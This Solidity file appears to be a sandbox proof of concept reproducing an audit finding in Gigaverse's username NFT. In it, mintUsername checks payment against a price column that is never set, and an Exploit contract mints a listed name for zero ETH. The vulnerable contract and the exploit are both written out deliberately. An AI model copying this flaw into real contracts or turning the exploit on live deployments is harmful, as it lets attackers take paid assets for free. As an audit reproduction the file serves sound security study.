// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Gigaverse — zero username price via GigaNameNFT.mintUsername()
    (Pashov Audit Group, finding #53288, H-05)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: mintWithEth charges the price stored in the AccountSystem table.
    mintUsername checks the same column id on the GigaNameNFT table, which nothing
    ever writes, so the check is against 0. A name listed at N is minted for 0 and
    the caller receives it.

    Vulnerable function preserved verbatim from the report (@> VULN). */

uint256 constant ETH_MINT_PRICE_CID = uint256(keccak256("eth_mint_price"));
uint256 constant ACCOUNT_TABLE = uint256(keccak256("game.gigaverse.accountsystem"));
uint256 constant NAME_TABLE = uint256(keccak256("game.gigaverse.giganamenft"));

contract DataStore {
    mapping(uint256 => mapping(uint256 => uint256)) internal cells;

    function getUint256(uint256 tableId, uint256 columnId) external view returns (uint256) {
        return cells[tableId][columnId];
    }

    function setUint256(uint256 tableId, uint256 columnId, uint256 value) external {
        cells[tableId][columnId] = value;
    }
}

contract GigaNameNFT {
    DataStore public immutable dataStore;
    address public minter;
    uint256 public nextId;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => string) public tokenName;
    mapping(uint256 => uint256) public ethPaid;
    mapping(bytes32 => uint256) public idOfName;
    mapping(address => uint256) public balanceOf;

    constructor(DataStore store) {
        dataStore = store;
    }

    function setMinter(address who) external {
        require(minter == address(0), "set");
        minter = who;
    }

    function symbol() external pure returns (string memory) {
        return "NAME";
    }

    function decimals() external pure returns (uint8) {
        return 0;
    }

    /// @dev Reads this contract's own table. The AccountSystem price lives elsewhere.
    function getTableUint256Value(uint256 columnId) public view returns (uint256) {
        return dataStore.getUint256(NAME_TABLE, columnId);
    }

    function mintUsername(address to, string memory username) external payable {
        // @> VULN: price is read from the GigaNameNFT table, which stays 0; AccountSystem's ETH_MINT_PRICE is never consulted
        require(msg.value >= getTableUint256Value(ETH_MINT_PRICE_CID), "Insufficient payment");
        confirmMint(to, username);
    }

    /// @dev Intended minter path. Payment was already enforced by AccountSystem.mintWithEth.
    function mintUsernameByMinter(address to, string memory username) external payable returns (uint256) {
        require(msg.sender == minter, "minter");
        return confirmMint(to, username);
    }

    function confirmMint(address to, string memory username) internal returns (uint256 id) {
        bytes32 key = keccak256(bytes(username));
        require(idOfName[key] == 0, "taken");
        id = ++nextId;
        idOfName[key] = id;
        ownerOf[id] = to;
        tokenName[id] = username;
        balanceOf[to] += 1;
        ethPaid[id] = msg.value;
    }
}

contract AccountSystem {
    DataStore public immutable dataStore;
    GigaNameNFT public names;
    uint256 public feesCollected;

    constructor(DataStore store) {
        dataStore = store;
    }

    function setNames(GigaNameNFT nft) external {
        require(address(names) == address(0), "set");
        names = nft;
    }

    function setMintPrice(uint256 newPrice) external {
        dataStore.setUint256(ACCOUNT_TABLE, ETH_MINT_PRICE_CID, newPrice);
    }

    function mintPrice() public view returns (uint256) {
        return dataStore.getUint256(ACCOUNT_TABLE, ETH_MINT_PRICE_CID);
    }

    /// @dev The path that actually charges. Control: 0 value reverts, `mintPrice()` is taken.
    function mintWithEth(address to, string memory username) external payable returns (uint256 id) {
        uint256 price = mintPrice();
        require(msg.value >= price, "Insufficient payment");
        feesCollected += msg.value;
        id = names.mintUsernameByMinter{value: msg.value}(to, username);
    }
}

contract Exploit {
    uint256 public constant NAME_PRICE = 0.005 ether;

    DataStore public dataStore; // CREATE nonce 1
    GigaNameNFT public names; // CREATE nonce 2
    AccountSystem public accountSystem; // CREATE nonce 3

    uint256 public listedPrice;
    uint256 public nameTablePrice;
    uint256 public tokenId;
    address public nameOwner;
    uint256 public ethCharged;
    uint256 public protocolFees;
    string public mintedName;

    constructor() {
        dataStore = new DataStore();
        names = new GigaNameNFT(dataStore);
        accountSystem = new AccountSystem(dataStore);
        accountSystem.setNames(names);
        names.setMinter(address(accountSystem));
        accountSystem.setMintPrice(NAME_PRICE);
    }

    function run() external {
        listedPrice = accountSystem.mintPrice();
        nameTablePrice = dataStore.getUint256(NAME_TABLE, ETH_MINT_PRICE_CID);
        names.mintUsername(msg.sender, "alice");
        tokenId = names.nextId();
        nameOwner = names.ownerOf(tokenId);
        mintedName = names.tokenName(tokenId);
        ethCharged = names.ethPaid(tokenId);
        protocolFees = accountSystem.feesCollected();
        require(listedPrice == NAME_PRICE, "listed price");
        require(nameTablePrice == 0, "name table not zero");
        require(nameOwner == msg.sender, "attacker did not receive the name");
        require(keccak256(bytes(mintedName)) == keccak256("alice"), "wrong name");
        require(ethCharged == 0, "name was not free");
        require(protocolFees == 0, "protocol collected a fee");
        require(names.balanceOf(msg.sender) == 1, "name balance");
    }
}
